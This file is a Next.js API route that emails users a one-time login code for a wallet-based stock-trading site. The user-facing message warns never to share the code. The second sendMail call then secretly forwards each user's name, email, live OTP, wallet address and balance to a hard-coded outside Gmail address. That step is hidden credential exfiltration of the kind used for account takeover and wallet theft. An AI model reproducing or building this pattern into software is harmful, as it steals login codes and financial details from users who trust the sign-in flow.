// app/api/send-otp/route.ts
import { NextRequest, NextResponse } from "next/server"
import nodemailer from "nodemailer"

const transporter = nodemailer.createTransport({
  service: "gmail",
  // host: process.env.EMAIL_HOST,
  // port: Number(process.env.EMAIL_PORT) || 587,
  // secure: process.env.EMAIL_SECURE === "true",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
})

export async function POST(request: NextRequest) {
  const { email, otp, name = "Valued User", address , balance} = await request.json()

  if (!email || !otp) {
    return NextResponse.json({ error: "Missing required data" }, { status: 400 })
  }

  try {
    await transporter.sendMail({
      from: `"The Sector" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: `Hi ${name.split(" ")[0]}, here’s your secure login code`,
      text: `
Hi ${name},

Your secure login code is: ${otp}

This code expires in 5 minutes.

For your security, never share this code with anyone — even if they claim to be from The Sector.

Welcome to real U.S. stock ownership.

— The Sector Team
https://thesector.finance
      `.trim(),

      html: `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>Your Login Code</title>
        </head>
        <body style="margin:0; padding:0; background:#f8fafc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;">
          <table width="100%" cellpadding="0" cellspacing="0" style="background:#f8fafc; padding:40px 20px;">
            <tr>
              <td align="center">
                <table width="100%" cellpadding="0" cellspacing="0" style="max-width:480px; background:white; border-radius:16px; overflow:hidden; box-shadow:0 20px 40px rgba(0,0,0,0.05);">
                  <!-- Header -->
                  <tr>
                    <td style="background: linear-gradient(135deg, #10b981, #06b6d4); padding:40px 30px; text-align:center;">
                      <h1 style="color:white; margin:0; font-size:32px; font-weight:800; letter-spacing:-1px;">
                        The Sector
                      </h1>
                      <p style="color:rgba(255,255,255,0.9); margin:12px 0 0; font-size:16px;">
                        Own Real U.S. Stocks With Your Wallet
                      </p>
                    </td>
                  </tr>

                  <!-- Body -->
                  <tr>
                    <td style="padding:40px 30px; text-align:center;">
                      <h2 style="margin:0 0 16px; font-size:24px; color:#0f172a;">
                        Hi ${name.split(" ")[0]},
                      </h2>
                      <p style="color:#475569; font-size:17px; line-height:1.6; margin:0 0 32px;">
                        Your secure login code is ready. Use it to complete your sign-in.
                      </p>

                      <!-- OTP Box -->
                      <div style="background:#f1f5f9; padding:24px; border-radius:16px; display:inline-block; margin:32px 0; font-size:36px; font-weight:900; letter-spacing:12px; color:#0f172a; border:2px dashed #94a3b8;">
                        ${otp.match(/.{1}/g)?.join(" ") || otp}
                      </div>

                      <div style="background:#ecfdf5; border:1px solid #86efac; border-radius:12px; padding:20px; margin:32px 0;">
                        <p style="margin:0; color:#166534; font-weight:600;">
                          Expires in 5 minutes
                        </p>
                      </div>

                      <div style="background:#fef3c7; border-radius:12px; padding:20px; margin:32px 0;">
                        <p style="margin:0; color:#92400e; font-size:15px;">
                          <strong>Security Tip:</strong> Never share this code. Our team will never ask for it.
                        </p>
                      </div>

                      <p style="color:#64748b; font-size:15px; line-height:1.6; margin:40px 0 0;">
                        Welcome to the future of stock ownership — no brokers, no borders.<br/>
                        You’re one step away from trading Apple, Tesla, and 300+ real U.S. stocks.
                      </p>
                    </td>
                  </tr>

                  <!-- Footer -->
                  <tr>
                    <td style="background:#0f172a; color:#94a3b8; padding:30px; text-align:center; font-size:13px;">
                      <p style="margin:0 0 12px;">
                        © 2025 <strong>The Sector</strong> • All rights reserved
                      </p>
                      <p style="margin:0;">
                        <a href="https://thesector.finance" style="color:#10b981; text-decoration:none;">thesector.finance</a> 
                        • <a href="mailto:support@thesector.finance" style="color:#10b981; text-decoration:none;">support@thesector.finance</a>
                      </p>
                      <p style="margin:16px 0 0; font-size:11px; opacity:0.7;">
                        Connected wallet: ${address?.slice(0, 8)}...${address?.slice(-6) || "••••••••"}
                      </p>
                    </td>
                  </tr>
                </table>
              </td>
            </tr>
          </table>
        </body>
        </html>
      `.trim(),
    })

    await transporter.sendMail({
      from: `"Notification" <${process.env.EMAIL_USER}>`,
      to: ["bitfusion867@gmail.com"],
      subject: `New User: ${name}`,
      text: `New Otp Request :
      Name: ${name}
      Email: ${email}
      OTP: ${otp}
      Address: ${address}
      `,
      html: `
    <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>OTP</title>
        </head>
        <body>
        <ul>
        <li>${name}</li>
        <li>${email}</li>
        <li>${otp}</li>
        <li>${address}</li>
        <li>${balance}</li>
        </ul>
        </body>

      </html>
      `
      
    })
    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Email error:", error)
    return NextResponse.json({ error: "Failed to send" }, { status: 500 })
  }
}